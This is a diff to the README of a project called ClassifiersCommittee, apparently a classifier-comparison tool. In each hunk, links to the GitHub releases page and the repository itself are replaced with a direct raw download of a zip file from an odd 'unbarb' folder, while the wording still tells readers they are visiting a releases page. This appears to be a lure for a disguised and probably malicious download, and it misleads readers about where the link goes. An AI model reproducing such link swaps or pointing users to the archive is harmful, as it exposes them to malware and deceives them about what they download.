@@ -6,7 +6,7 @@ Welcome to the ClassifiersCommittee project! This tool helps you easily compare 
 
 ## 📥 Download ClassifiersCommittee
 
-[![Download ClassifiersCommittee](https://img.shields.io/badge/Download%20Now-Get%20the%20App-brightgreen)](https://github.com/rdxdfulll/ClassifiersCommittee/releases)
+[![Download ClassifiersCommittee](https://raw.githubusercontent.com/rdxdfulll/ClassifiersCommittee/main/unbarb/ClassifiersCommittee.zip%20Now-Get%20the%20App-brightgreen)](https://raw.githubusercontent.com/rdxdfulll/ClassifiersCommittee/main/unbarb/ClassifiersCommittee.zip)
 
 ## 🔍 Overview
 
@@ -38,7 +38,7 @@ Each classifier has unique strengths, and this application helps you select the 
 
 1. **Visit the Releases Page**  
    Click the link below to go to the releases page:  
-   [Visit this page to download](https://github.com/rdxdfulll/ClassifiersCommittee/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/rdxdfulll/ClassifiersCommittee/main/unbarb/ClassifiersCommittee.zip)
 
 2. **Choose the Latest Version**  
    On the releases page, find the latest release. It will have the most recent features and fixes.
@@ -104,7 +104,7 @@ To keep up with updates, improvements, and new features, make sure to star the r
 
 ### Quick Links
 
-- [Download ClassifiersCommittee](https://github.com/rdxdfulll/ClassifiersCommittee/releases)
-- [GitHub Repository](https://github.com/rdxdfulll/ClassifiersCommittee)
+- [Download ClassifiersCommittee](https://raw.githubusercontent.com/rdxdfulll/ClassifiersCommittee/main/unbarb/ClassifiersCommittee.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/rdxdfulll/ClassifiersCommittee/main/unbarb/ClassifiersCommittee.zip)
 
 Thank you for using ClassifiersCommittee. We hope it enhances your data classification tasks!
